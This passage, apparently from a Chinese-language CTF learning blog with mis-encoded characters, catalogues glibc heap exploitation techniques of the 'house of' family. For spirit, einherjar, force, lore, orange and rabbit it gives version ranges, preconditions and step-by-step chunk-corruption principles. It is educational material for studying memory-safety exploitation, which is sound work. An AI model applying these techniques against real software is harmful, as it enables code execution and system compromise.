†åˆ©ç”¨æ›´å¤šçš„æ˜¯ä¸ºäº†ä¸¾ä¸€åä¸‰ï¼Œä¸ºäº†æ›´å¥½åœ°æŒæ¡æ¼æ´æŒ–æ˜æ¨¡å¼ã€æ¼æ´åˆ†ææ–¹æ³•ï¼Œè€Œä¸ä»…ä»…æ˜¯ä¸ºäº†æ¯”èµ›ã€‚</p><p><code>house of</code> ç³»åˆ—çš„è¡¨æ ¼å¦‚ä¸‹ï¼Œé€‚ç”¨ç‰ˆæœ¬ä¸è€ƒè™‘ä½äº <code>glibc-2.23</code> çš„ç‰ˆæœ¬ã€‚æˆ‘å°†åœ¨ä¸‹æ–‡ä¸­è¿›ä¸€æ­¥é˜è¿°æ¯ä¸€ä¸ªåˆ©ç”¨æ‰‹æ³•çš„åŸç†ã€ä½¿ç”¨åœºæ™¯ä¸é€‚ç”¨èŒƒå›´ã€‚</p><table><thead><tr><th>æ”»å‡»æ–¹æ³•</th><th>å½±å“èŒƒå›´</th><th>å­¦ä¹ é“¾æ¥</th></tr></thead><tbody><tr><td>house of spirit</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/244158">å †åˆ©ç”¨ç³»åˆ—ä¹‹ house of spirit - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of einherjar</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/251596">PWNâ€”â€”House Of Einherjar CTF Wiki ä¾‹é¢˜è¯¦è§£ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of force</td><td>2.23â€”â€”2.29</td><td><a href="https://www.anquanke.com/post/id/175630">Top chunk åŠ«æŒï¼šHouse of force æ”»å‡» - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of lore</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/">House of Lore - CTF Wiki (ctf-wiki.org)</a></td></tr><tr><td>house of orange</td><td>2.23â€”â€”2.26</td><td><a href="https://www.anquanke.com/post/id/218887">House of orange - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of rabbit</td><td>2.23â€”â€”2.28</td><td><a href="http://p4nda.top/2018/04/18/house-of-rabbit/">http://p4nda.top/2018/04/18/house-of-rabbit/</a></td></tr><tr><td>house of roman</td><td>2.23â€”â€”2.29</td><td><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-roman/">House of Roman - CTF Wiki (ctf-wiki.org)</a></td></tr><tr><td>house of storm</td><td>2.23â€”â€”2.29</td><td><a href="https://www.anquanke.com/post/id/203096">House of storm åŸç†åŠåˆ©ç”¨ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of corrosion</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://xz.aliyun.com/t/6862#toc-5">House-of-Corrosion ä¸€ç§æ–°çš„å †åˆ©ç”¨æŠ€å·§ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></td></tr><tr><td>house of husk</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/202387">house-of-husk å­¦ä¹ ç¬”è®° - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of atum</td><td>2.26â€”â€”2.30</td><td><a href="https://abf1ag.github.io/2021/06/11/house-of-atum/">https://abf1ag.github.io/2021/06/11/house-of-atum/</a></td></tr><tr><td>house of kauri</td><td>2.26â€”â€”2.32</td><td><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-kauri">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></td></tr><tr><td>house of fun</td><td>2.23â€”â€”2.30</td><td><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-fun">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></td></tr><tr><td>house of mind</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.35/house_of_mind_fastbin.c">how2heap/house_of_mind_fastbin.c at master Â· shellphish/how2heap (github.com)</a></td></tr><tr><td>house of muney</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/254797">House of Muney åˆ†æ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of botcake</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://forum.butian.net/share/1709">å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº - æ·±å…¥ç†è§£ House of Botcake å †åˆ©ç”¨æ‰‹æ³• (butian.net)</a></td></tr><tr><td>house of rust</td><td>2.26â€”â€” è‡³ä»Š</td><td><a href="https://github.com/c4ebt/House-of-Rust">c4ebt/House-of-Rust</a></td></tr><tr><td>house of crust</td><td>2.26â€”â€”2.37</td><td><a href="https://github.com/c4ebt/House-of-Rust">c4ebt/House-of-Rust</a></td></tr><tr><td>house of io</td><td>2.26â€”â€” è‡³ä»Š</td><td><a href="https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#house-of-io">Overview of GLIBC heap exploitation techniques (0x434b.dev)</a></td></tr><tr><td>house of banana</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/222948">house of banana - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of kiwi</td><td>2.23â€”â€”2.36</td><td><a href="https://www.anquanke.com/post/id/235598">House OF Kiwi - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of emma</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/260614">house of emma</a></td></tr><tr><td>house of pig</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.anquanke.com/post/id/242640">house of pig ä¸€ä¸ªæ–°çš„å †åˆ©ç”¨è¯¦è§£ - å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a></td></tr><tr><td>house of obstack</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://tttang.com/archive/1845/">ä¸€æ¡æ–°çš„ glibc IO_FILE åˆ©ç”¨é“¾ï¼š_IO_obstack_jumps åˆ©ç”¨åˆ†æ - è·³è·³ç³– (tttang.com)</a></td></tr><tr><td>house of apple1</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-1/">House of Apple ä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³• (1) - roderick - record and learn! (roderickchan.cn)</a></td></tr><tr><td>house of apple2</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-2/">House of Apple ä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³• (2) - roderick - record and learn! (roderickchan.cn)</a></td></tr><tr><td>house of apple3</td><td>2.23â€”â€” è‡³ä»Š</td><td><a href="https://www.roderickchan.cn/zh-cn/house-of-apple-%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84glibc%E4%B8%ADio%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95-3/">House of Apple ä¸€ç§æ–°çš„ glibc ä¸­ IO æ”»å‡»æ–¹æ³• (3) - roderick - record and learn! (roderickchan.cn)</a></td></tr><tr><td>house of gods</td><td>2.23â€”â€”2.27</td><td><a href="https://github.com/Milo-D/house-of-gods/blob/master/rev2/HOUSE_OF_GODS.TXT">house-of-gods/HOUSE_OF_GODS.TXT at master Â· Milo-D/house-of-gods (github.com)</a></td></tr></tbody></table><p>æ­¤å¤–ï¼Œé˜…è¯»ä¸‹æ–‡ä¹‹å‰éœ€è¦äº†è§£ï¼š</p><ul><li>ä¸‹é¢æ‰€è¿°çš„ <code>chunk A</code>ï¼Œåœ°å€ <code>A</code> æŒ‡çš„æ˜¯ <code>chunk header</code> åœ°å€ï¼Œè€Œä¸æ˜¯ <code>user data</code> åœ°å€ã€‚</li><li>æ¼æ´æˆå› åŸºæœ¬ä¸Šéƒ½æ˜¯å †æº¢å‡ºã€<code>UAF</code> ç­‰</li></ul><h1 id="2-house-of-ç³»åˆ—"><a href="#2-house-of-ç³»åˆ—" class="headerlink" title="2-house of ç³»åˆ—"></a>2-house of ç³»åˆ—</h1><h2 id="2-1-house-of-spirit"><a href="#2-1-house-of-spirit" class="headerlink" title="2.1-house of spirit"></a>2.1-house of spirit</h2><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™</p><h3 id="é€‚ç”¨èŒƒå›´"><a href="#é€‚ç”¨èŒƒå›´" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li></ul><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨å †æº¢å‡ºï¼Œä¿®æ”¹ <code>chunk size</code>ï¼Œä¼ªé€ å‡º <code>fake chunk</code>ï¼Œç„¶åé€šè¿‡å †çš„é‡Šæ”¾å’Œæ’å¸ƒï¼Œæ§åˆ¶ <code>fake chunk</code>ã€‚<code>house of spirit</code> çš„æ“ä½œæ€è·¯æœ‰å¾ˆå¤šï¼Œæ¯”å¦‚å¯ä»¥æŒ‰å¦‚ä¸‹æ“ä½œè¿›è¡Œåˆ©ç”¨ï¼š</p><ul><li>ç”³è¯· <code>chunk Aã€chunk Bã€chunk Cã€chunk D</code></li><li>å¯¹ <code>A</code> å†™æ“ä½œçš„æ—¶å€™æº¢å‡ºï¼Œä¿®æ”¹ <code>B</code> çš„ <code>size</code> åŸŸï¼Œä½¿å…¶èƒ½åŒ…æ‹¬ <code>chunk C</code></li><li>é‡Šæ”¾ <code>B</code>ï¼Œç„¶åæŠŠ <code>B</code> ç”³è¯·å›æ¥ï¼Œå†é‡Šæ”¾ <code>C</code>ï¼Œåˆ™å¯ä»¥é€šè¿‡è¯»å†™ <code>B</code> æ¥æ§åˆ¶ <code>C</code> çš„å†…å®¹</li></ul><h3 id="ç›¸å…³æŠ€å·§"><a href="#ç›¸å…³æŠ€å·§" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>èµ·åˆ <code>house of spirit</code> ä¸»è¦æ˜¯é’ˆå¯¹ <code>fastbin</code>ï¼Œåæ¥å¼•å…¥äº† <code>tcachebin</code> åï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ <code>tcachebin</code> ç‰ˆæœ¬çš„ <code>house of spirit</code>ã€‚åˆ©ç”¨æ–¹æ³•ä¸ <code>fastbin</code> åœºæ™¯ä¸‹ç±»ä¼¼ï¼Œæ³¨æ„å¥½ä¸åŒç‰ˆæœ¬ä¸‹çš„æ£€æŸ¥æ¡ä»¶å³å¯ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ"><a href="#åˆ©ç”¨æ•ˆæœ" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>åŠ«æŒ <code>fastbin/tcachebin</code> çš„ <code>fd</code> ä¹‹åï¼Œå¯ä»¥ä»»æ„åœ°å€åˆ†é…ã€ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="2-2-house-of-einherjar"><a href="#2-2-house-of-einherjar" class="headerlink" title="2.2-house of einherjar"></a>2.2-house of einherjar</h2><h3 id="æ¼æ´æˆå› -1"><a href="#æ¼æ´æˆå› -1" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>æº¢å‡ºå†™ã€<code>off by one</code>ã€<code>off by null</code></p><h3 id="é€‚ç”¨èŒƒå›´-1"><a href="#é€‚ç”¨èŒƒå›´-1" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>å¯åˆ†é…å¤§äºå¤„äº <code>unsortedbin</code> çš„ <code>chunk</code></li></ul><h3 id="åˆ©ç”¨åŸç†-1"><a href="#åˆ©ç”¨åŸç†-1" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åˆ©ç”¨ <code>off by null</code> ä¿®æ”¹æ‰ <code>chunk</code> çš„ <code>size</code> åŸŸçš„ <code>P</code> ä½ï¼Œç»•è¿‡ <code>unlink</code> æ£€æŸ¥ï¼Œåœ¨å †çš„åå‘åˆå¹¶è¿‡ç¨‹ä¸­æ„é€ å‡º <code>chunk overlapping</code>ã€‚</p><ul><li>ç”³è¯· <code>chunk Aã€chunk Bã€chunk Cã€chunk D</code>ï¼Œ<code>chunk D</code> ç”¨æ¥åš <code>gap</code>ï¼Œ<code>chunk Aã€chunk C</code> éƒ½è¦å¤„äº <code>unsortedbin</code> èŒƒå›´</li><li>é‡Šæ”¾ <code>A</code>ï¼Œè¿›å…¥ <code>unsortedbin</code></li><li>å¯¹ <code>B</code> å†™æ“ä½œçš„æ—¶å€™å­˜åœ¨ <code>off by null</code>ï¼Œä¿®æ”¹äº† <code>C</code> çš„ <code>P</code> ä½</li><li>é‡Šæ”¾ <code>C</code> çš„æ—¶å€™ï¼Œå †åå‘åˆå¹¶ï¼Œç›´æ¥æŠŠ <code>Aã€Bã€C</code> ä¸‰å—å†…å­˜åˆå¹¶ä¸ºäº†ä¸€ä¸ª <code>chunk</code>ï¼Œå¹¶æ”¾åˆ°äº† <code>unsortedbin</code> é‡Œé¢</li><li>è¯»å†™åˆå¹¶åçš„å¤§ <code>chunk</code> å¯ä»¥æ“ä½œ <code>chunk B</code> çš„å†…å®¹ï¼Œ<code>chunk B</code> çš„å¤´</li></ul><h3 id="ç›¸å…³æŠ€å·§-1"><a href="#ç›¸å…³æŠ€å·§-1" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>è™½ç„¶è¯¥åˆ©ç”¨æŠ€å·§è‡³ä»Šä»å¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯éœ€è¦å¯¹ <code>unlink</code> ç»•è¿‡çš„æ¡ä»¶éšç€ç‰ˆæœ¬çš„å¢åŠ æœ‰æ‰€å˜åŒ–ã€‚</p><p>æœ€å¼€å§‹çš„ <code>unlink</code> çš„ä»£ç æ˜¯ï¼š</p><p>| <code>1 2 3 4 5 6 7 8 9 10</code> | <code>/* Take a chunk off a bin list */ #define unlink(AV, P, BK, FD) {                                            \    FD = P-&gt;fd;      \    BK = P-&gt;bk;      \    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \    else {      \ // .....      \      }      \ }</code> |<br>| â€”â€”â€”â€”â€”â€”â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” |<br>|                          |                                                              |</p><p>åªéœ€è¦ç»•è¿‡<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> å³å¯ï¼Œå› æ­¤ï¼Œä¸éœ€è¦ä¼ªé€ åœ°å€å¤„äºé«˜ä½çš„ <code>chunk</code> çš„ <code>presize</code> åŸŸã€‚</p><p>é«˜ç‰ˆæœ¬çš„ <code>unlink</code> çš„æ¡ä»¶æ˜¯ï¼š</p><p>æ–°å¢äº† <code>chunksize (p) != prev_size (next_chunk (p))</code>ï¼Œå¯¹ <code>chunksize</code> æœ‰äº†æ£€æŸ¥ï¼Œä¼ªé€ çš„æ—¶å€™éœ€è¦ç»•è¿‡ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-1"><a href="#åˆ©ç”¨æ•ˆæœ-1" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>æ„é€  <code>chunk overlap</code> åï¼Œå¯ä»¥ä»»æ„åœ°å€åˆ†é…</li><li>ç»“åˆå…¶ä»–æ–¹æ³•è¿›è¡Œä»»æ„åœ°å€è¯»å†™</li></ul><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h2 id="ä¾‹é¢˜ï¼š"><a href="#ä¾‹é¢˜ï¼š" class="headerlink" title="ä¾‹é¢˜ï¼š"></a>ä¾‹é¢˜ï¼š</h2><h3 id="2016-seccon-tinypad"><a href="#2016-seccon-tinypad" class="headerlink" title="2016_seccon_tinypad"></a>2016_seccon_tinypad</h3><h2 id="2-3-house-of-force"><a href="#2-3-house-of-force" class="headerlink" title="2.3-house of force"></a>2.3-house of force</h2><h3 id="æ¼æ´æˆå› -2"><a href="#æ¼æ´æˆå› -2" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™ <code>top_chunk</code></p><h3 id="é€‚ç”¨èŒƒå›´-2"><a href="#é€‚ç”¨èŒƒå›´-2" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.29</code></li><li>å¯åˆ†é…ä»»æ„å¤§å°çš„ <code>chunk</code></li><li>éœ€è¦æ³„éœ²æˆ–å·²çŸ¥åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-2"><a href="#åˆ©ç”¨åŸç†-2" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>å¯¹ <code>top_chunk</code> çš„åˆ©ç”¨ï¼Œè¿‡ç¨‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk A</code></li><li>å†™ <code>A</code> çš„æ—¶å€™æº¢å‡ºï¼Œä¿®æ”¹ <code>top_chunk</code> çš„ <code>size</code> ä¸ºå¾ˆå¤§çš„æ•°</li><li>åˆ†é…å¾ˆå¤§çš„ <code>chunk</code> åˆ°ä»»æ„å·²çŸ¥åœ°å€</li></ul><h3 id="ç›¸å…³æŠ€å·§-2"><a href="#ç›¸å…³æŠ€å·§-2" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>æ³¨æ„ï¼Œåœ¨ <code>glibc-2.29</code> ååŠ å…¥äº†æ£€æµ‹ï¼Œ<code>house of force</code> åŸºæœ¬å¤±æ•ˆï¼š</p><p class='item-img' data-src='https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230303194137930.png'><img src="https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20230303194137930.png" alt="image-20230303194137930"></p><h3 id="åˆ©ç”¨æ•ˆæœ-2"><a href="#åˆ©ç”¨æ•ˆæœ-2" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="2-4-house-of-lore"><a href="#2-4-house-of-lore" class="headerlink" title="2.4-house of lore"></a>2.4-house of lore</h2><h3 id="æ¼æ´æˆå› -3"><a href="#æ¼æ´æˆå› -3" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºã€<code>use after free</code>ã€<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-3"><a href="#é€‚ç”¨èŒƒå›´-3" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€” è‡³ä»Š</li><li>éœ€è¦æ³„éœ²æˆ–å·²çŸ¥åœ°å€</li></ul><h3 id="åˆ©ç”¨åŸç†-3"><a href="#åˆ©ç”¨åŸç†-3" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>æ§åˆ¶ <code>smallbin</code> çš„ <code>bk</code> æŒ‡é’ˆï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><ul><li>ç”³è¯· <code>chunk Aã€chunk Bã€chunk C</code>ï¼Œå…¶ä¸­ <code>chunk B</code> å¤§å°ä½äº <code>smallbin</code></li><li>é‡Šæ”¾ <code>B</code>ï¼Œç”³è¯·æ›´å¤§çš„ <code>chunk D</code>ï¼Œä½¿å¾— <code>B</code> è¿›å…¥ <code>smallbin</code></li><li>å†™ <code>A</code>ï¼Œæº¢å‡ºä¿®æ”¹ <code>B</code> çš„ <code>bk</code>ï¼ŒæŒ‡å‘åœ°å€ <code>X</code>ï¼Œè¿™é‡Œæœ‰ <code>fake chunk</code></li><li>å¸ƒç½® <code>X-&gt;fd == &amp;B</code></li><li>åˆ†é…ä¸¤æ¬¡åå³å¯å–å‡ºä½äº <code>X</code> åœ°å€å¤„çš„ <code>fake chunk</code></li></ul><h3 id="ç›¸å…³æŠ€å·§-3"><a href="#ç›¸å…³æŠ€å·§-3" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><p>åœ¨å¼•å…¥äº† <code>tcache stash unlink</code> çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ç»•è¿‡ï¼š</p><p>è¦ä¹ˆä½¿å…¶æ»¡è¶³ <code>tc_victim = last (bin)) == bin</code>ã€è¦ä¹ˆä½¿å…¶æ»¡è¶³ï¼š<code>tcache-&gt;counts[tc_idx] â‰¥ mp_.tcache_count</code>ã€‚å¦åˆ™å¯èƒ½ä¼šå› ä¸ºéæ³•å†…å­˜è®¿é—®ä½¿å¾—ç¨‹åº <code>down</code> æ‰ã€‚</p><p>å®é™…ä¸Šï¼Œè¿™ä¸ªæŠ€å·§ç”¨å¾—ä¸æ˜¯å¾ˆå¤šï¼Œå› ä¸ºåœ¨åŒç­‰æ¡ä»¶ä¸‹ï¼Œæ›´åå‘äºåˆ©ç”¨ <code>fastbin/tcachebin</code>ã€‚</p><h3 id="åˆ©ç”¨æ•ˆæœ-3"><a href="#åˆ©ç”¨æ•ˆæœ-3" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„åœ°å€åˆ†é…</li><li>ä»»æ„åœ°å€è¯»å†™</li></ul><h2 id="2-5-house-of-orange"><a href="#2-5-house-of-orange" class="headerlink" title="2.5-house of orange"></a>2.5-house of orange</h2><h3 id="æ¼æ´æˆå› -4"><a href="#æ¼æ´æˆå› -4" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™</p><h3 id="é€‚ç”¨èŒƒå›´-4"><a href="#é€‚ç”¨èŒƒå›´-4" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.26</code></li><li>æ²¡æœ‰ <code>free</code></li><li>å¯ä»¥ <code>unsortedbin attack</code></li></ul><h3 id="åˆ©ç”¨åŸç†-4"><a href="#åˆ©ç”¨åŸç†-4" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p><code>house of orange</code> å¯ä»¥è¯´æ˜¯å¼€å¯äº†å †ä¸ <code>IO</code> ç»„åˆåˆ©ç”¨çš„å…ˆæ²³ï¼Œæ˜¯éå¸¸ç»å…¸ã€æ¼‚äº®ã€ç²¾å½©çš„åˆ©ç”¨ç»„åˆæŠ€ã€‚åˆ©ç”¨è¿‡ç¨‹è¿˜è¦ç»“åˆ <code>top_chunk</code> çš„æ€§è´¨ï¼Œåˆ©ç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼š</p><p><strong>stage1</strong></p><ul><li>ç”³è¯· <code>chunk A</code>ï¼Œå‡è®¾æ­¤æ—¶çš„ <code>top_chunk</code> çš„ <code>size</code> ä¸º <code>0xWXYZ</code></li><li>å†™ <code>A</code>ï¼Œæº¢å‡ºä¿®æ”¹ <code>top_chunk</code> çš„ <code>size</code> ä¸º <code>0xXYZ</code>ï¼ˆéœ€è¦æ»¡è¶³é¡µå¯¹é½çš„æ£€æµ‹æ¡ä»¶ï¼‰</li><li>ç”³è¯·ä¸€ä¸ªå¤§äº <code>0xXYZ</code> å¤§å°çš„ <code>chunk</code>ï¼Œæ­¤æ—¶ <code>top_chunk</code> ä¼šè¿›è¡Œ <code>grow</code>ï¼Œå¹¶å°†åŸæ¥çš„ <code>old top_chunk</code> é‡Šæ”¾è¿›å…¥ <code>unsortedbin</code></li></ul><p><strong>stage2</strong></p><ul><li>æº¢å‡ºå†™ <code>A</code>ï¼Œä¿®æ”¹å¤„äº <code>unsortedbin</code> ä¸­çš„ <code>old top_chunk</code>ï¼Œä¿®æ”¹å…¶ <code>size</code> ä¸º <code>0x61</code>ï¼Œå…¶ <code>bk</code> ä¸º <code>&amp;_IO_list_all-0x10</code>ï¼ŒåŒæ—¶ä¼ªé€ å¥½ <code>IO_FILE</code> ç»“æ„</li><li>ç”³è¯·é <code>0x60</code> å¤§å°çš„ <code>chunk</code> çš„æ—¶å€™ï¼Œé¦–å…ˆè§¦å‘ <code>unsortedbin attack</code>ï¼Œå°†<code>_IO_list_all</code> ä¿®æ”¹ä¸º <code>main_arena+88</code>ï¼Œç„¶å <code>unsortedbin chunk</code> ä¼šè¿›å…¥åˆ° <code>smallbin</code>ï¼Œå¤§å°ä¸º <code>0x60</code>ï¼›æ¥ç€éå† <code>unsortedbin</code> çš„æ—¶å€™è§¦å‘äº† <code>malloc_printerr</code>ï¼Œç„¶åè°ƒç”¨é“¾ä¸ºï¼š<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>ï¼Œè°ƒç”¨åˆ°ä¼ªé€ çš„ <code>vtable</code> é‡Œé¢çš„å‡½æ•°æŒ‡é’ˆ</li></ul><h3 id="ç›¸å…³æŠ€å·§-4"><a href="#ç›¸å…³æŠ€å·§-4" class="headerlink" title="ç›¸å…³æŠ€å·§"></a>ç›¸å…³æŠ€å·§</h3><ul><li>åœ¨ <code>glibc-2.24</code> ååŠ å…¥äº† <code>vtable</code> çš„ <code>check</code>ï¼Œä¸èƒ½ä»»æ„åœ°å€ä¼ªé€  <code>vatble</code> äº†ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨ <code>IO_str_jumps</code> ç»“æ„è¿›è¡Œåˆ©ç”¨ã€‚</li><li>åœ¨ <code>glibc-2.26</code> åï¼Œ<code>malloc_printerr</code> ä¸å†åˆ·æ–° <code>IO</code> æµäº†ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•å¤±æ•ˆ</li><li>ç”±äº<code>_mode</code> çš„æ­£è´Ÿæ€§æ˜¯éšæœºçš„ï¼Œå½±å“åˆ¤æ–­æ¡ä»¶ï¼Œå¤§æ¦‚æœ‰ <code>1/2</code> çš„æ¦‚ç‡ä¼šåˆ©ç”¨å¤±è´¥ï¼Œå¤šè¯•å‡ æ¬¡å°±å¥½</li></ul><h3 id="åˆ©ç”¨æ•ˆæœ-4"><a href="#åˆ©ç”¨æ•ˆæœ-4" class="headerlink" title="åˆ©ç”¨æ•ˆæœ"></a>åˆ©ç”¨æ•ˆæœ</h3><ul><li>ä»»æ„å‡½æ•°æ‰§è¡Œ</li><li>ä»»æ„å‘½ä»¤æ‰§è¡Œ</li></ul><h2 id="2-6-house-of-rabbit"><a href="#2-6-house-of-rabbit" class="headerlink" title="2.6-house of rabbit"></a>2.6-house of rabbit</h2><h3 id="æ¼æ´æˆå› -5"><a href="#æ¼æ´æˆå› -5" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><p>å †æº¢å‡ºå†™ã€<code>use after free</code>ã€<code>edit after free</code></p><h3 id="é€‚ç”¨èŒƒå›´-5"><a href="#é€‚ç”¨èŒƒå›´-5" class="headerlink" title="é€‚ç”¨èŒƒå›´"></a>é€‚ç”¨èŒƒå›´</h3><ul><li><code>2.23</code>â€”â€”<code>2.26</code></li><li>è¶…è¿‡ <code>0x400</code> å¤§å°çš„å †åˆ†é…</li><li>å¯ä»¥å†™ <code>fastbin</code> çš„ <code>fd</code> æˆ–è€… <code>size</code> åŸŸ</li></ul><h3 id="åˆ©ç”¨åŸç†-5"><a href="#åˆ©ç”¨åŸç†-5" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>è¯¥åˆ©ç”¨æŠ€å·§çš„æ ¸å¿ƒæ˜¯ <code>malloc_consolidate</code> å‡½æ•°ï¼Œå½“æ£€æµ‹åˆ°æœ‰ <code>fastbin</code> çš„æ—¶å€™ï¼Œä¼šå–å‡ºæ¯ä¸€ä¸ª <code>fastbin chunk</code>ï¼Œå°†å…¶æ”¾ç½®åˆ° <code>unsortedbin</code> 